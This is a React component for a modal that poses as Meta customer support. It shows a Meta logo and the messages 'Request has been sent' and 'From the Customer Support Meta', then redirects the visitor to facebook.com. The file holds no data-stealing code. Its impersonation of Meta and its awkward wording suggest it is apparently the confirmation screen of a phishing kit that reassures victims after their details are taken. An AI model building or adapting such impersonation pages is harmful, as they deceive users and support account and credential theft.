'use client';

import MetaLogo from '@/assets/images/meta-logo-grey.png';
import SuccessImage from '@/assets/images/succes.jpg';
import type { SuccessModalProps } from '@/types/modal';
import { imageSrc } from '@/utils/image-src';
import type { CSSProperties, FC } from 'react';

const SuccessModal: FC<SuccessModalProps> = ({ show, texts }) => {
    if (!show) return null;

    const overlayStyle: CSSProperties = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '8px',
        overflowY: 'auto',
        scrollbarWidth: 'none',
        msOverflowStyle: 'none'
    };

    const modalStyle: CSSProperties = {
        width: '100%',
        maxWidth: '512px',
        backgroundColor: '#fff',
        borderRadius: '16px',
        boxShadow: '0 20px 50px rgba(15, 23, 42, 0.2)',
        padding: '20px',
        display: 'flex',
        flexDirection: 'column',
        minHeight: 'min(860px, calc(100vh - 16px))',
        maxHeight: 'min(860px, calc(100vh - 16px))',
        overflowY: 'auto'
    };

    const contentStyle: CSSProperties = {
        display: 'flex',
        flexDirection: 'column',
        flex: 1
    };

    const titleStyle: CSSProperties = {
        width: '100%',
        fontSize: '18px',
        fontWeight: 700,
        color: '#1c1e21',
        margin: '0 0 16px 0',
        textAlign: 'left',
        lineHeight: 1.2
    };

    const imageContainerStyle: CSSProperties = {
        width: '100%',
        borderRadius: '10px',
        overflow: 'hidden',
        marginBottom: '14px'
    };

    const contentBoxStyle: CSSProperties = {
        textAlign: 'left',
        width: '100%',
        maxWidth: '100%',
        marginBottom: '16px'
    };

    const mainTextStyle: CSSProperties = {
        fontSize: '15px',
        color: '#9a979e',
        lineHeight: '1.35',
        margin: 0,
        fontWeight: 400
    };

    const buttonStyle: CSSProperties = {
        width: '100%',
        minHeight: '40px',
        fontSize: '14px',
        fontWeight: 600,
        color: '#fff',
        backgroundColor: '#0064E0',
        border: 'none',
        borderRadius: '999px',
        cursor: 'pointer',
        transition: 'background-color 0.2s',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center'
    };

    const footerStyle: CSSProperties = {
        width: '64px',
        margin: '20px auto 0'
    };

    return (
        <div style={overlayStyle}>
            <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
                <div style={contentStyle}>
                    <h2 style={titleStyle}>{texts.successTitle || 'Request has been sent'}</h2>

                    <div style={imageContainerStyle}>
                        <img
                            src={imageSrc(SuccessImage)}
                            alt={texts.altSuccess || 'Success'}
                            style={{ width: '100%', display: 'block' }}
                        />
                    </div>

                    <div style={contentBoxStyle}>
                        <p style={{ ...mainTextStyle, marginBottom: '4px' }}>
                            {texts.successMessage1 ||
                                'Your request has been added to the processing queue. We will handle your request within 24 hours.'}
                        </p>
                        <p style={mainTextStyle}>{texts.successMessage2 || 'From the Customer Support Meta.'}</p>
                    </div>

                    <button
                        type="button"
                        style={buttonStyle}
                        onClick={() => {
                            window.location.href = 'https://www.facebook.com';
                        }}
                        onMouseOver={(e) => {
                            e.currentTarget.style.backgroundColor = '#1d4ed8';
                        }}
                        onMouseOut={(e) => {
                            e.currentTarget.style.backgroundColor = '#0064E0';
                        }}
                    >
                        {texts.confirm || 'Return to Facebook'}
                    </button>

                    <div style={footerStyle}>
                        <img
                            src={imageSrc(MetaLogo)}
                            width="100%"
                            alt={texts.altMeta || 'Meta'}
                            style={{ objectFit: 'contain' }}
                        />
                    </div>
                </div>
            </div>
        </div>
    );
};

export default SuccessModal;
